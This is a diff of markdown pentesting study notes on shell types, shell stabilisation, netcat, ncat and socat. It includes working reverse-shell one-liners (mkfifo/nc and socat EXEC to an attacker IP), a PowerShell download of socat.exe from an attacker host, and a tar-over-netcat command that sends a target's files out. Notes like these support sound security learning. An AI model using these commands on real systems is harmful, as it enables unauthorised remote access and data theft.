@@ -1,16 +1,16 @@
 # Shells
 
 ## Introduction
+This is conceptual breakdown of types of shells for a list of reverse shells check [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
 
 # Shell Stablisation Methods
-
 
 Netcat shell stablisation
 ```bash
 //python trick
 //python2|3 remember!
 python -c 'import pty;pty.spawn("/bin/bash")'
-export TERM=xterml
+export TERM=xterm
 CTRL+Z
 stty raw -echo; fg
 ```
@@ -21,7 +21,6 @@ sudo apt install rlwrap
 rlwrap nc -lvnp <port>
 ```
 OR
-
 //stepto-socat trick
 ```bash
 sudo python3 -m http.server 80
@@ -38,7 +37,6 @@ Invoke-WebRequest -uri <local-ip>/socat.exe -outfile C:\\Windows\temp\socat.exe
 
 bash nc -e workaround
 ```bash
-
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
 ```
 
@@ -66,13 +64,11 @@ A shell is command line or grapical user interface of a system, the outermost la
 
 Quick useful list of linux networking commands help
 ```bash
-ipconfig
+ipconfig # legacy ip
 ip 
 systemctl <start/stop> <service>
-
 wget http://
 curl http://
-
 ```
 
 Quick useful list of windows networking commands help
@@ -101,10 +97,7 @@ Reverse DEFINE: opposite to a bind shell. The listener is on the attacker machin
 nc -nv <IP> 
 ```
 ### Listening
--l create listener
--p listen port
--n skips dns name resolution
--v verbose
+A breakdown the command below `-l` creates listener, `-p` listen port, `-n` skips dns name resolution and `-v`  adds verbosity:
 ```bash
 nc -lvnp <IP> <PORT>
 ```
@@ -119,8 +112,8 @@ Alot of machines do not support -e option for obvious security reasons
 -e bash
 -e cmd.exe
 ```
-Kali linux and general -e explainations:
-{toogle}```
+##### Kali linux and general -e explainations:
+```{toogle}
 Kali linux has nc compiled with the flag:
 `-DGAPING_SECURITY_HOLE` and enabled -e option unlike MOST modern Linux/BSD system DON'T SUPPORT -e; WHY?
 -e Option can redirect 
@@ -139,6 +132,35 @@ Transfer files to windows
 locate wget.exe
 nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe
 ```
+
+## Ncat
+[Ncat](https://nmap.org/ncat/) is a feature-packed networking utility which reads and writes data across networks from the command line.
+```
+  .       .       
+  \`-"'"-'/       
+   } 6 6 {        
+  ==. Y ,==       
+    /^^^\  .      
+   /     \  )     
+  (  )-(  )/     _
+  -""---""---   / 
+ /   Ncat    \_/  
+(     ____        
+ \_.=|____E
+ 
+```
+
+#### File transfers
+Target machine
+```bash
+tar cf - . | nc $IP $PORT
+```
+Attack machine
+```bash
+ncat -nlvp $PORT | tar xf -
+```
+
+
 ## Socat 
 Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. For penetration testing, it is similar to Netcat but has additional useful features.
 
@@ -195,11 +217,11 @@ stty raw -echo; fg
 ```bash
 socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
-pty, allocates a pseudoterminal on the target -- part of the stabilisation process
-stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
-sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
-setsid, creates the process in a new session
-sane, stabilises the terminal, attempting to "normalise" it
+1. pty, allocates a pseudoterminal on the target -- part of the stabilisation process
+1. stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
+1. sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
+1. setsid, creates the process in a new session
+1. sane, stabilises the terminal, attempting to "normalise" it
 
 ### ENCRYPTING SHELLS
  
